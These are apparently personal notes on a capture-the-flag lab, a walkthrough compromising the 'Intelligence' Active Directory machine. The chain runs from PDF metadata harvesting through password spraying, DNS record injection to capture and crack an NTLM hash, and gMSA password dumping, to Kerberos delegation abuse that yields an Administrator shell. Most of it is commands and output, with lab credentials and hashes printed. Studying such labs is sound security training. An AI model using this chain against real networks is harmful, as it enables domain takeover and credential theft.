## Intelligence 

### Lab Details 

- Difficulty: Medium
- Type: DNS, Active Directory, Windows

#### Enumeration
- run `nmap`
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Intelligence
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-06 19:31:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2025-10-06T19:32:53+00:00; +7h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-06T19:32:54+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2025-10-06T19:32:53+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-06T19:32:54+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
```
- run `feroxbuster` for directory and endpoint enumeration 
```bash
$ feroxbuster -u http://intelligence.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -force-recursion
                                                                                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://intelligence.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 💾  Output File           │ rce-recursion
 🏁  HTTP methods          │ [GET]
 🪓  Add Slash             │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       56l      165w     1850c http://intelligence.htb/documents/scripts.js
200      GET        1l       44w     2532c http://intelligence.htb/documents/jquery.easing.min.js
200      GET      208l      768w    47856c http://intelligence.htb/documents/2020-01-01-upload.pdf
200      GET      106l      659w    26989c http://intelligence.htb/documents/demo-image-01.jpg
200      GET        8l       29w    28898c http://intelligence.htb/documents/favicon.ico
200      GET      209l      800w    48542c http://intelligence.htb/documents/2020-12-15-upload.pdf
<SNIP>
```
- found two files in documents directory `2020-12-15-upload.pdf` and `2020-01-01-upload.pdf`
- we can attempt to enumerate files with similar names 
- create a `python` script to generate list of dates 
```python
from datetime import datetime, timedelta

current_date = datetime(2020, 1, 1)

end_date = datetime.now()

while current_date.date() < end_date.date():

	print(current_date.strftime("%Y-%m-%d"))

	current_date += timedelta(days=1)
```
- download the `pdf` files 
```bash
$ python3 pdf.py | xargs -I {} wget "http://10.129.95.154/documents/{}-upload.pdf" 

$ ls
2020-01-01-upload.pdf  2020-03-05-upload.pdf  2020-05-21-upload.pdf  2020-06-28-upload.pdf  2020-09-06-upload.pdf  2020-11-13-upload.pdf  2021-02-21-upload.pdf
2020-01-02-upload.pdf  2020-03-12-upload.pdf  2020-05-24-upload.pdf  2020-06-30-upload.pdf  2020-09-11-upload.pdf  2020-11-24-upload.pdf  2021-02-25-upload.pdf
2020-01-04-upload.pdf  2020-03-13-upload.pdf  2020-05-29-upload.pdf  2020-07-02-upload.pdf  2020-09-13-upload.pdf  2020-11-30-upload.pdf  2021-03-01-upload.pdf
2020-01-10-upload.pdf  2020-03-17-upload.pdf  2020-06-02-upload.pdf  2020-07-06-upload.pdf  2020-09-16-upload.pdf  2020-12-10-upload.pdf  2021-03-07-upload.pdf
2020-01-20-upload.pdf  2020-03-21-upload.pdf  2020-06-03-upload.pdf  2020-07-08-upload.pdf  2020-09-22-upload.pdf  2020-12-15-upload.pdf  2021-03-10-upload.pdf
2020-01-22-upload.pdf  2020-04-02-upload.pdf  2020-06-04-upload.pdf  2020-07-20-upload.pdf  2020-09-27-upload.pdf  2020-12-20-upload.pdf  2021-03-18-upload.pdf
2020-01-23-upload.pdf  2020-04-04-upload.pdf  2020-06-07-upload.pdf  2020-07-24-upload.pdf  2020-09-29-upload.pdf  2020-12-24-upload.pdf  2021-03-21-upload.pdf
2020-01-25-upload.pdf  2020-04-15-upload.pdf  2020-06-08-upload.pdf  2020-08-01-upload.pdf  2020-09-30-upload.pdf  2020-12-28-upload.pdf  2021-03-25-upload.pdf
2020-01-30-upload.pdf  2020-04-23-upload.pdf  2020-06-12-upload.pdf  2020-08-03-upload.pdf  2020-10-05-upload.pdf  2020-12-30-upload.pdf  2021-03-27-upload.pdf
2020-02-11-upload.pdf  2020-05-01-upload.pdf  2020-06-14-upload.pdf  2020-08-09-upload.pdf  2020-10-19-upload.pdf  2021-01-03-upload.pdf  pdf.py
2020-02-17-upload.pdf  2020-05-03-upload.pdf  2020-06-15-upload.pdf  2020-08-19-upload.pdf  2020-11-01-upload.pdf  2021-01-14-upload.pdf
2020-02-23-upload.pdf  2020-05-07-upload.pdf  2020-06-21-upload.pdf  2020-08-20-upload.pdf  2020-11-03-upload.pdf  2021-01-25-upload.pdf
2020-02-24-upload.pdf  2020-05-11-upload.pdf  2020-06-22-upload.pdf  2020-09-02-upload.pdf  2020-11-06-upload.pdf  2021-01-30-upload.pdf
2020-02-28-upload.pdf  2020-05-17-upload.pdf  2020-06-25-upload.pdf  2020-09-04-upload.pdf  2020-11-10-upload.pdf  2021-02-10-upload.pdf
2020-03-04-upload.pdf  2020-05-20-upload.pdf  2020-06-26-upload.pdf  2020-09-05-upload.pdf  2020-11-11-upload.pdf  2021-02-13-upload.pdf
```
- once we have all of the `pdf` file downloaded we can analyse further
- examine the file creator of the file and write into `userlist` file
 ```bash
$ exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq > userlist
   99 image files read
   
$ cat userlist 
Anita.Roberts
Brian.Baker
Brian.Morris
Creator
Daniel.Shelton
Danny.Matthews
Darryl.Harris
David.Mcbride
David.Reed
David.Wilson
Ian.Duncan
Jason.Patterson
Jason.Wright
Jennifer.Thomas
Jessica.Moody
John.Coleman
Jose.Williams
Kaitlyn.Zimmerman
Kelly.Long
Nicole.Brock
Richard.Williams
Samuel.Richardson
Scott.Scott
Stephanie.Young
Teresa.Williamson
Thomas.Hall
Thomas.Valenzuela
Tiffany.Molina
Travis.Evans
Veronica.Patel
William.Lee
```
- convert `pdf` to text and read the first line of each file
```bash
$ for f in *pdf; do pdftotext $f; done

$ head -n1 *txt
==> 2020-01-01-upload.txt <==
Dolore ut etincidunt adipisci aliquam labore.

==> 2020-01-02-upload.txt <==
Adipisci dolor eius porro.

==> 2020-01-04-upload.txt <==
Consectetur dolorem ipsum sed quisquam est ipsum etincidunt.

==> 2020-01-10-upload.txt <==
Dolore adipisci neque porro consectetur porro.
<SNIP>
==> 2020-06-04-upload.txt <==
New Account Guide
<SNIP>
==> 2020-12-30-upload.txt <==
Internal IT Update
<SNIP>
```
- found two files with actual content
![[2020-06-04.png]]
- found `NewIntelligenceCorpUser9876` password
![[2020-12-30.png]]
- we can use the `userlist` to perform password spary
```bash
$ nxc smb 10.129.95.154 -u userlist -p NewIntelligenceCorpUser9876
[*] Copying default configuration file
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
<SNIP>
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```
- found valid credential for `Tiffany.Molina`
#### Initial Foothold 
- check if `Tiffany.Molina` has access to SMB shares
```bash
$ nxc smb 10.129.95.154 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.129.95.154   445    DC               [*] Enumerated shares
SMB         10.129.95.154   445    DC               Share           Permissions     Remark
SMB         10.129.95.154   445    DC               -----           -----------     ------
SMB         10.129.95.154   445    DC               ADMIN$                          Remote Admin
SMB         10.129.95.154   445    DC               C$                              Default share
SMB         10.129.95.154   445    DC               IPC$            READ            Remote IPC
SMB         10.129.95.154   445    DC               IT              READ            
SMB         10.129.95.154   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.95.154   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.95.154   445    DC               Users           READ 
```
- there is `powershell` script in `IT` share
```           
$ smbclient //10.129.95.154/IT -U Tiffany.Molina
Password for [WORKGROUP\Tiffany.Molina]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr 18 19:50:55 2021
  ..                                  D        0  Sun Apr 18 19:50:55 2021
  downdetector.ps1                    A     1046  Sun Apr 18 19:50:55 2021

		3770367 blocks of size 4096. 1447449 blocks available
smb: \> mget downdetector.ps1 
```

#### Lateral Movement (If any)
- examine the `powershell` script
```bash
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```
- we see that the script is sending a request to domains under `intelligence.htb` to check whether if the a site is down
- we can attempt to add a new record to the domain as `Tiffany.Molina` 
```bash
$ python3 dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 --action add --record web-attk1 --data 10.10.16.34 --type A 10.129.85.115
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```
- wait for 5 minutes and we get a NTLM hash back as user `Ted.Graves`
```bash
[HTTP] NTLMv2 Client   : 10.129.85.115
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:b82beb57b3506827:2D6713760DF6BDC4A01D52967D5B2DB9:010100000000000094542E9F3D37DC01783F3A22FDE7A62200000000020008004C0036004400450001001E00570049004E002D003600330033005A004C00490057005600430039005300040014004C003600440045002E004C004F00430041004C0003003400570049004E002D003600330033005A004C004900570056004300390053002E004C003600440045002E004C004F00430041004C00050014004C003600440045002E004C004F00430041004C00080030003000000000000000000000000020000092E4036DDC447F1714AEC6A98988EB5F8896B27E7C24FF6D2FBFD6E4BCD8FD0C0A0010000000000000000000000000000000000009003E0048005400540050002F007700650062002D006100740074006B0031002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000 
```
- crack it with `hashcat`
```bash
$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt 
<SNIP>
TED.GRAVES::intelligence:b82beb57b3506827:2d6713760df6bdc4a01d52967d5b2db9:010100000000000094542e9f3d37dc01783f3a22fde7a62200000000020008004c0036004400450001001e00570049004e002d003600330033005a004c00490057005600430039005300040014004c003600440045002e004c004f00430041004c0003003400570049004e002d003600330033005a004c004900570056004300390053002e004c003600440045002e004c004f00430041004c00050014004c003600440045002e004c004f00430041004c00080030003000000000000000000000000020000092e4036ddc447f1714aec6a98988eb5f8896b27e7c24ff6d2fbfd6e4bcd8fd0c0a0010000000000000000000000000000000000009003e0048005400540050002f007700650062002d006100740074006b0031002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy
<SNIP>
```
#### Privilege Escalation
- run `bloodhound-py` and load the `json` files to the dashboard
![[AD/Medium/Intelligence/bloodhound.png]]
- select `Ted.Graves` and `Reachable High Value Targets` option we see that `Ted.Graves` belongs to `IT Support` group which has `ReadGMSAPassword` privilege over `SVC_INT`
- use [`gMSADumper.py`](https://github.com/micahvandeusen/gMSADumper) to get the hash of service account `svc_int`
```bash
$ python gMSADumper/gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l 10.129.85.115
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::c5f5537e080917d785293aeb90120854
svc_int$:aes256-cts-hmac-sha1-96:a90da9b1d3dff35359ccd55cad2d218057cb8d13cd4feca8a34df44cbfb9e61b
svc_int$:aes128-cts-hmac-sha1-96:e17e370a4030f67428f7046f065e60eb
```
- then we can get service ticket as admin
```bash
$ impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator -dc-ip 10.129.85.115 intelligence.htb/svc_int -hashes :c5f5537e080917d785293aeb90120854Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```
- authenticate via `Kerberos` using the ticket
```bash
$ export KRB5CCNAME=Administrator.ccache;wmiexec.py -k -no-pass dc.intelligence.htb
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
intelligence\administrator
```
#### Resources

#### Lesson Learned
